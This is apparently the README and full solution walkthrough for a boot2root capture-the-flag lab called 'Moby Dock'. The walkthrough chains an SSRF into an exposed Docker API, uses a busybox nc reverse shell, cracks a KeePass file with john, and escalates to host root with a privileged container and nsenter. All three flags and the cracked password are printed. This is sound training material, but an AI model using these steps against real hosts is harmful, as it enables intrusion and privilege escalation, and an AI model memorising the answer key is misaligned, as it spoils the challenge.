# Moby Dock

**Category:** Boot2root  **Difficulty:** Medium-Hard  **Author:** AbuCTF

> H7Corp's DevOps team runs everything in containers and swears the setup is locked down. The only thing they left facing the network is an internal tooling portal. Find out what it talks to.

Run: `vagrant up` (VirtualBox, about 2 GB RAM, first boot takes 10-15 minutes). The box comes up at `192.168.56.10`. `provisioning/` is spoilers.

## Solution

```
:8080 portal --SSRF--> :8090 gateway --> :2375 docker api --> exec in `pacman`   flag1
pacman's ro mount leaks .system.kdbx --> crack --> abu's ssh key                flag2
abu is in the docker group --> host root                                         flag3
```

Only 22 and 8080 are open. The portal's `/validator` fetches any URL on localhost (GET only, a few ports blocked), so I used it to scan loopback and found an API gateway on 8090. Its `/docs` lists `/proxy?service=...&path=...` and `/request?url=...&method=...&data=...`. `/request` is the useful one because it lets a GET-only SSRF send POSTs. `service=docker` points at `localhost:2375`.

`/request` blocks `/containers/create?`, `/build?` and `Privileged`, so no new containers. There's already one running, `pacman` (busybox), and inspecting it shows two read-only mounts: `/flag1.txt` and a fake apt cache at `/var/cache/apt/archives`. Create an exec in it with a busybox `nc` reverse shell and start it, all through `/request`. `solution/solve.py 192.168.56.10 LHOST` does this.

```
/ # cat /flag1.txt
/ # ls -la /var/cache/apt/archives        # .system.kdbx
```

Pull the kdbx out and crack it:

```
keepass2john .system.kdbx > kdbx.hash
john --wordlist=rockyou.txt kdbx.hash      # expectopatronum
keepassxc-cli show -s .system.kdbx "H7Corp Infrastructure/Abu SSH Access"
```

The notes field holds abu's private key; the other entries are decoys. SSH in for flag 2. abu is in the `docker` group, and the gateway's blocklist doesn't apply to the local socket:

```
docker run --rm -it --pid=host --privileged alpine nsenter -t 1 -m -u -i -n sh
```

That's `solution/root.sh`. `docker run -v /:/host -it alpine chroot /host` works too. abu's `sudo systemctl` rule is a rabbit hole.

```
flag1  H7CTF{d0ck3r_4p1_3xp0s3d_w1th0ut_4uth_1s_d34dly_d4ng3r0us}
flag2  H7CTF{c0nt41n3r_br34k0ut_pr1v1l3g3d_3sc4p3_t0_h0st_succ3ssful}
flag3  H7CTF{d0ck3r_esc4p3_v1a_n4m3sp4c3_sh4r1ng_and_nsent3r}
```
